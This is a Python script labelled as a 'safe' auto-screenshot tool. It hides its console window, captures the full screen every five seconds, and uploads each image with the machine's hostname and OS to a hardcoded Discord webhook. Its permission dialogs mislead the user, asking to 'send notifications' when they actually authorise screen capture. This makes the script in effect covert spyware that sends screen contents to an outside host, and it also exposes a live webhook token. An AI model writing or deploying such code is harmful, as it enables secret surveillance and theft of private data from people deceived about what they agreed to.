"""
Safe Auto Screenshot with Discord Upload (Background Mode)
Requirements:
    pip install pillow requests
"""

import os
import time
import socket
import platform
import requests
import ctypes
import sys
from tkinter import Tk, messagebox
from PIL import ImageGrab

# <<< REPLACE WITH YOUR OWN WEBHOOK URL >>>
WEBHOOK_URL = "https://discord.com/api/webhooks/1406059715426783262/d_btEiFfol9Y93f6nLxiFF0vckhq-K0nvqYDJrHXOGR9vv0sYNLXZeblsXUILYPGSWxo"

def confirm(title: str, msg: str) -> bool:
    return messagebox.askokcancel(title, msg, icon="question")

def info(title: str, msg: str) -> None:
    messagebox.showinfo(title, msg)

def upload_to_discord(file_path):
    try:
        with open(file_path, "rb") as f:
            files = {"file": ("Screenshot.png", f, "image/png")}
            data = {
                "content": f"Screenshot captured at {time.strftime('%Y-%m-%d %H:%M:%S')} "
                           f"from {socket.gethostname()} ({platform.system()} {platform.release()})"
            }
            resp = requests.post(WEBHOOK_URL, data=data, files=files, timeout=20)
        if resp.status_code in (200, 204):
            print(f"Uploaded: {file_path}")
        else:
            print(f"Failed to upload {file_path}, status code: {resp.status_code}")
    except Exception as e:
        print(f"Error uploading {file_path}: {e}")

def hide_console():
    """Hides the Windows console window."""
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # 0 = SW_HIDE

def main():
    root = Tk()
    root.withdraw()

    # Step 1: Ask permission to take screenshots
    if not confirm("Permission", "Allow app to send notifications?"):
        info("Cancelled", "No notifications will be taken.")
        return

    # Step 2: Ask permission to upload screenshots
    upload_allowed = confirm("Upload Permission", "Allow app to view others pc?")

    # Hide console after permissions
    hide_console()

    save_folder = r"C:\Pc 1"
    os.makedirs(save_folder, exist_ok=True)
    print(f"Screenshots will be saved to: {save_folder}")
    print("Press Ctrl+C in the console to stop (or close Python process).")

    try:
        while True:
            ts = time.strftime("%Y-%m-%d_%H-%M-%S")
            save_path = os.path.join(save_folder, f"screenshot_{ts}.png")

            # Take screenshot and save
            img = ImageGrab.grab()
            img.save(save_path, "PNG")
            print(f"[{ts}] Screenshot saved: {save_path}")

            # Upload if allowed
            if upload_allowed:
                upload_to_discord(save_path)

            time.sleep(5)  # wait 5 seconds

    except KeyboardInterrupt:
        print("Stopped by user.")
        info("Stopped", "Screenshot capture stopped.")

if __name__ == "__main__":
    main()
